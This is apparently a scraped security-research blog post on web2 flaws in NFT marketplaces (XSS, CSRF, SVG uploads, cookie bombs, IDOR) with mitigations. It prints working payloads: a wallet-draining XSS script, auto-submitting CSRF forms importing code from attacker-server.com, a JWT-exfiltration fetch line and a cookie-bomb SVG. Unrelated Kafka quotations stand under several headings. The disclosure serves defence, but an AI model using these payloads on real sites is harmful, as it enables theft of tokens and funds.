# [H] OtterSec: Web2 bug repellant instructions

## Summary
Severity: High
Published: Fri, 11 Aug 2023
Source: https://osec.io/blog/web2-bug-repellant-instructions/
Type: security-research

## Details
## Web2 bug repellant instructions

 Caue Obici , Bruno Halltari Aug 11, 2023 #nft-marketplaces #xss An analysis of security risks that donât get enough attention - web2 bugs in web3 apps. We take a deep and practical look at vulnerabilities across various applications.

## Introduction 

 Transitioning to a fully decentralized web is hard. Many Web 3 applications still have large, unexplored Web 2 attack surfaces.

## Discovery 

 In this blog post, weâll explore these lingering threats and potential mitigations. This work summarizes our internal research against various applications, from NFT marketplaces to wallets to protocol frontends.

 As a note, generally applications with non-trivial frontends are more susceptible to these vulnerabilities. Hence, a lot of our research focused on the interactions with NFTs, an ideal Web 2.5 candidate in many senses.

## XSS 

 I cannot make you understand. I cannot make anyone understand what is happening inside me. I cannot even explain it to myself . 

## Managing metadata 

 Effectively managing metadata is a challenge. When improperly sanitized, unsuspecting metadata becomes a dangerous sink for malicious payloads .

 We showcase this vulnerability in the Rocki Marketplace . The 
```
 artistDescription 
```
 parameter was improperly sanitized, allowing arbitrary HTML input without any validation checks:

 When a user loads such a maliciously constructed NFT, theyâll unwittingly execute our payload, giving us full control over their account:

 Of course, this is merely a toy payload. An actual hacker could use this to spread through the marketplace, creating a wormable payload that takes over the entire website.

## Whereâs my wallet 

 Whatâs the worst that can happen? How does losing your wallet funds sound?

 Note Triggering this exploit requires some interaction. However, in practice users likely are not carefully examining the wallet prompts, especially on familiar sites.

 It is important to recognize that the presence of XSS in marketplaces can trigger the approval prompt in various wallets, including the attackerâs assets.

 In the following example, this malicious transaction was initiated by malicious code injected into rocki.com:

 And here is the code used to achieve it:

```

```
 1

 function request () { 

 2

 if ( typeof window . ethereum === 'undefined' ) { 

 3

 console . error ( 'Please install MetaMask to use this feature.' ) ; 

 4

 } else { 

 5

 ethereum . request ( { method : 'eth_requestAccounts' } ) . then ( ( accounts ) => { 

 6

 const fromAddress = accounts[ 0 ] ; 

 7

 const attackerAddress = '0x0000000000000000000000000000000000000000' ; 

 8

 const contractAddress = '0xa01000c52b234a92563ba61e5649b7c76e1ba0f3' ; 

 9

 23 collapsed lines 

 10

 let tokenAbi = [ 

 11

 { 

 12

 constant : false , 

 13

 inputs : [ 

 14

 { 

 15

 name : '_to' , 

 16

 type : 'address' , 

 17

 }, 

 18

 { 

 19

 name : '_value' , 

 20

 type : 'uint256' , 

 21

 }, 

 22

 ] , 

 23

 name : 'transfer' , 

 24

 outputs : [ 

 25

 { 

 26

 name : '' , 

 27

 type : 'bool' , 

 28

 }, 

 29

 ] , 

 30

 type : 'function' , 

 31

 }, 

 32

 ] ; 

 33

 34

 const web3 = new Web3 (window . ethereum) ; 

 35

 36

 const tokenContract = new web3 . eth . Contract (tokenAbi , contractAddress) ; 

 37

 38

 const transactionObject = { 

 39

 from : fromAddress , 

 40

 to : contractAddress , 

 41

 data : tokenContract . methods 

 42

 . transfer (attackerAddress , web3 . utils . toWei ( '100000000' , 'ether' )) 

 43

 . encodeABI () , 

 44

 }; 

 45

 46

 web3 . eth . sendTransaction (transactionObject) ; 

 47

 } ) ; 

 48

 } 

 49

 } 

 50

 51

 import ( 'https://cdn.jsdelivr.net/gh/ethereum/web3.js@1.0.0-beta.36/dist/web3.min.js' ) ; 

 52

 setTimeout (request , 1e3 ) ; 

```

```

 { const fromAddress = accounts[0]; const attackerAddress = '0x0000000000000000000000000000000000000000'; const contractAddress = '0xa01000c52b234a92563ba61e5649b7c76e1ba0f3'; let tokenAbi = [ { constant: false, inputs: [ { name: '_to', type: 'address', }, { name: '_value', type: 'uint256', }, ], name: 'transfer', outputs: [ { name: '', type: 'bool', }, ], type: 'function', }, ]; const web3 = new Web3(window.ethereum); const tokenContract = new web3.eth.Contract(tokenAbi, contractAddress); const transactionObject = { from: fromAddress, to: contractAddress, data: tokenContract.methods .transfer(attackerAddress, web3.utils.toWei('100000000', 'ether')) .encodeABI(), }; web3.eth.sendTransaction(transactionObject); }); }}import('https://cdn.jsdelivr.net/gh/ethereum/web3.js@1.0.0-beta.36/dist/web3.min.js');setTimeout(request, 1e3);"> 

## CSRF & XSS 

 We continued our investigation of potential XSS vulnerabilities by exploring various sinks, such as common field errors and the handling of file uploads in different marketplaces.

 Our attention was drawn to Rocki Marketplace , an online platform that allows users to upload images. During the image uploading process, we noticed that certain parameters were being sent in the request, as shown below:

 Here is the code:

```

```
 1

 < html > 

 2

 < body > 

 3

 < script > history . pushState ( '' , '' , '/' ) </ script > 

 4

 < form id = "form123" action = "https://stashh.io/upload_asset" method = "POST" enctype = "multipart/form-data" value = "asd" > 

 5

 < input type = "file" name = "data" id = "file123" > 

 6

 < input type = "hidden" name = "config" value = " & #123; & quot ; address & quot ;& #58; & quot ; secret1k6tng55v0zgufpcx8wa2w33asl82fhx84tn3hq & lt ; img & #47; src & #61; x & #32; onerror & #61; alert & #40; document & #46; domain & #41; & gt ;& quot ;& #44; & quot ; to & quot ;& #58; & quot ; profile & #45; assets & quot ;& #44; & quot ; type & quot ;& #58; & quot ; icon & quot ;& #125; " /> 

 7

 < input type = "submit" value = "Submit request" /> 

 8

 </ form > 

 9

 </ body > 

 10

 11

 < script > 

 12

 13

 ( async () => { 

 14

 const blob = await ( await fetch ( "/sapo.png" )) . blob () 

 15

 16

 let f = new File ([blob] , 'sapo.png' , { type : 'image/png' } ) 

 17

 const dataTransfer = new DataTransfer () ; 

 18

 dataTransfer . items . add (f) ; 

 19

 20

 file123 . files = dataTransfer . files ; 

 21

 } )() 

 22

 23

 </ script > 

 24

 </ html > 

```

```

           "> 

 When playing around with the application, we discovered that if an invalid address was submitted, the userâs input would be reflected directly inside the response, another possible XSS vulnerability.

 However, since the request was a POST request, we initially thought this was only a self-XSS.

 In an effort to increase the impact of the above vulnerability, we discovered a way to leverage Cross-Site Request Forgery (CSRF) to manipulate the userâs browser into sending a forced request that contained our XSS payload.

 From here, we were able to steal the session cookie from local storage:

```

```
 1

 < html > 

 2

 < body > 

 3

 < script > history . pushState ( '' , '' , '/' ) </ script > 

 4

 < form id = "form123" action = "https://stashh.io/upload_asset" method = "POST" enctype = "multipart/form-data" value = "asd" > 

 5

 < input type = "file" name = "data" id = "file123" > 

 6

 < input type = "hidden" name = "config" value = " & lcub ;& quot ; address & quot ;& colon ;& quot ;& lt ; img & sol ; src & equals ; x onerror & equals ; import & lpar ;& grave ; https & colon ;& sol ;& sol ; attacker-server & period ; com & sol ; leak & period ; js & grave ;& rpar ;& gt ;& quot ;& comma ;& quot ; to & quot ;& colon ;& quot ; profile-assets & quot ;& comma ;& quot ; type & quot ;& colon ;& quot ; icon & quot ;& rcub ; " /> 

 7

 < input type = "submit" value = "Submit request" /> 

 8

 </ form > 

 9

 </ body > 

 10

 11

 < script > 

 12

 13

 ( async () => { 

 14

 const blob = await ( await fetch ( "/sapo.png" )) . blob () 

 15

 16

 let f = new File ([blob] , 'sapo.png' , { type : 'image/png' } ) 

 17

 const dataTransfer = new DataTransfer () ; 

 18

 dataTransfer . items . add (f) ; 

 19

 20

 file123 . files = dataTransfer . files ; 

 21

 22

 form123 . submit () 

 23

 } )() 

 24

 25

 </ script > 

 26

 </ html > 

```

```

           "> 

 This script automatically sends the following config in the POST body, which triggers the XSS and imports a malicious JavaScript file from the attackerâs server:

```

```
 { 

 " address " : "<img/src=x onerror=import(`https://attacker-server.com/leak.js`)>" , 

 " to " : "profile-assets" , 

 " type " : "icon" 

 } 

```

```

 ", "to": "profile-assets", "type": "icon"}"> 

 Then, the imported script is able to exfiltrate the JWT authentication token from stashh.io:

```

```
 fetch ( `https://attacker-server.com/?token_leak= ${ localStorage . getItem ( 'token' ) } ` ) ; 

```

```

## SVGs 

 After closely analyzing various NFT marketplaces, we noticed a common shared feature; the ability to update profile pictures or insert NFT assets using SVG files. SVG is an XML-based format that defines graphics and how they interact.

 Unbeknownst to some people, SVG files can contain JavaScript and run arbitrary scripts:

```

```
 1

 <? xml version = "1.0" encoding = "UTF-8" ?> 

 2

 <! DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" > 

 3

 4

 < svg xmlns = "http://www.w3.org/2000/svg" > 

 5

 < title > XSS </ title > 

 6

 < script type = "text/javascript" > 

 7

 alert(document.domain); 

 8

 </ script > 

 9

 </ svg > 

```

```

    XSS   "> 

 Although some marketplaces restrict the upload of SVG files, we discovered a way to bypass these checks. One particular instance involved the xtingles Marketplace .

 Even though the file extension was validated based on its name, the content type was not checked. By renaming a file with an allowed extension and inserting an SVG file with the content type âsvg+xml,â, we were able to successfully upload the SVG file.

 Below, we show you how we did it.

 Request when the original SVG was sent, showing it is not accepted as a format:

 After changing the extension inside the file name:

## SVGs return 

 Weâll give credit where itâs due. Some marketplaces mitigate the impact of XSS by storing images in IPFS, Amazon S3 buckets, or CloudFront.

 Unfortunately, this mitigation is still susceptible to a âcookie bombâ attack.

 This type of attack overwhelms a web server with an excessive number of cookies and can be used to achieve a Denial of Service (DoS), preventing users from accessing the file on the third-party service:

```

```
 1

 <? xml version = "1.0" encoding = "UTF-8" ?> 

 2

 <! DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" > 

 3

 4

 < svg xmlns = "http://www.w3.org/2000/svg" > 

 5

 < title > XSS </ title > 

 6

 < script type = "text/javascript" > 

 7

 var Take_Domain = window.location.hostname.split('.').slice(-2).join('.'); 

 8

 var Set_Cookie = Array(10000).join('a'); 

 9

 10

 for (var i = 1; i < 99; i++) { 

 11

 document.cookie = 'Cookie' + i + '=' + Set_Cookie + ';Domain=' + Take_Domain; 

 12

 } 

 13

 </ script > 

 14

 </ svg > 

```

```

    XSS   "> 

 As a result, weâre able to prevent the user from loading images.

## Authentication 

 The door could not be heard slamming; they had probably left it open, as is the custom in homes where a great misfortune has occurred . 

## Verification token leakage 

 When a user signs up for a service or creates an account that requires email verification, the system generates a unique token and sends it to the provided email address.

 This token is usually a random combination of letters, numbers, and symbols that are designed to be difficult to guess. The user is then instructed to verify their email by clicking a link that was sent to their inbox. However, if the email verification flow is not implemented correctly, it can result in security vulnerabilities.

 Proof of Concept 
While reviewing the Tensor website source code, we found a feature that allowed us to send verification emails to any email with a spoofed verification link. This could potentially result in the leakage of email verification codes, enabling an attacker to associate a victimâs email with their own account.

 Hereâs the breakdown.

 First, we send the verification link to a userâs email:

 If the user clicks on the spoofed URL, their token will be stolen, allowing the attacker to link their account to the victimâs email.

## IDOR 

 As Gregor Samsa awoke one morning from uneasy dreams he found himself transformed in his bed into a gigantic insect . 

 During a security assessment of the Rocki Marketplace , a critical vulnerability known as an Insecure Direct Object Reference (IDOR) was identified within the social link modification functionality. Exploiting this vulnerability enables an attacker to modify the social media links of other users without proper authorization.

 The specific vulnerable endpoint was identified as a POST request to 
```
/api/user/modifySocialLink
```
, which is responsible for handling requests to update social media links associated with user accounts. This endpoint requires two parameters: 
```
newLink
```
 to specify the desired social media link and 
```
id
```
 to indicate the userâs ID.

 Now, to exploit this vulnerability, an attacker can intercept or modify the request being sent to the 
```
POST /api/user/modifySocialLink
```
 endpoint. By manipulating the 
```
id
```
 parameter with the user ID of another user, the attacker is able to bypass proper authorization checks and modify the social media link associated with the targeted userâs account.

 Here is an example of a request that modifies another userâs social media link to 
```
https://evil.com/
```
. To achieve this, we simply changed the 
```
id
```
 field value to one that belongs to another user:

 The following screenshot is the response to our request:

## Preventative action steps for marketplaces 

 To mitigate the vulnerabilities weâve discussed, NFT marketplaces must prioritize the implementation of robust security measures. Below, we outline potential mitigations that can help platforms enhance their security posture and protect users and their valuable digital assets.

 First and foremost, NFT marketplaces should prioritize security by strengthening their input validation and output encoding processes. This can be done by encoding untrusted data with HTML entities on the backend or using 
```
 innerText 
```
 instead of 
```
 innerHTML 
```
 on the client side:

```

```
 document . getElementById ( 'nftCollectionName' ) . innerText = nftCollectionName ; 

```

```

 However, rendering HTML or markdown user input is intended. In these cases, dangerous HTML tags need to be validated and sanitized via consolidated libraries like DOMPurify:

```

```
 var sanitizedInput = DOMPurify . sanitize (userInput) ; 

```

```

 This can effectively mitigate the risk of XSS attacks. With that being said, implementing security measures such as Content-Security-Policy (CSP) will help ensure that generated content is rendered safely, without compromising the platformâs security.

 Furthermore, a key step is for NFT marketplaces to establish strict file upload policies. By conducting thorough checks on file types and content, platforms can prevent the upload of potentially malicious SVG files. Validating both the file extension and content type will significantly reduce the risk of SVG-based XSS attacks, ensuring a safer user experience.

 Another precaution is to implement secure redirect mechanisms. By implementing a server-side allow-list of trusted domains, NFT marketplaces can prevent open redirect vulnerabilities. This ensures that users are directed only to trusted and intended domains, safeguarding them from potential phishing or malicious attacks where the authentication code is leaked. Here we are showing an example of a secure redirect by applying an allow-list :

```

```
 const allowDomains = [ 'https://allowed-domain' ] ; 

 if ( ! allowDomains . includes (domain)) { 

 throw new ApolloError ( 'invalid domain' ) ; 

 } 

```

```

 As GraphQL is widely utilized by NFT marketplaces, it is crucial to understand the reasons behind disabling certain features like introspection in production environments. By disabling introspection, it ensures that clients are unable to query the APIâs schema, preventing the potential exposure of sensitive information regarding its structure and implementation. Below, we provide an example of how to achieve this using the Apollo server:

```

```
 const server = new ApolloServer ( { 

 typeDefs , 

 resolvers , 

 introspection : false , 

 } ) ; 

```

```

 Similarly, when batching is enabled, the code should limit the number of queries that can run simultaneously and implement object request rate limiting. This additional measure helps protect the website from potential denial-of-service (DoS) attacks.

 Lastly, NFT marketplaces should pay close attention to authentication and authorization controls. Specifically, addressing third-party platform misconfiguration. Applying the least privilege principle is crucial for enhancing security.

 By implementing these security measures, NFT marketplaces can strengthen their security posture, build trust among users, and create a secure environment for the trading and exchange of valuable digital assets.

## Conclusion 

 To recap, the presence of Web 2 bugs in NFT marketplaces emphasizes the need to address the underlying security issues within these platforms. Developers must prioritize not only the integrity of on-chain operations, but also the security of off-chain processes. To ensure an overall robust and trustworthy ecosystem for NFT marketplaces, developers should focus on implementing comprehensive security measures across all the components of the marketplace, engage with a third-party auditor, and test the entire infrastructure as necessary to identify and address any potential vulnerabilities.

 Most of all, it is especially crucial to educate communities about risks and security best practices. By promoting awareness and providing transparent information, platforms can empower users to make informed decisions and protect themselves against potential scams or fraudulent activities.

 Caution (Disclaimer) Despite our consistent efforts to contact the Rocki Marketplace team regarding our findings, we unfortunately have not received a response. As a result, we decided to disclose this matter to our readers. We will continue to closely monitor the situation and remain open in helping their team resolve this issue.
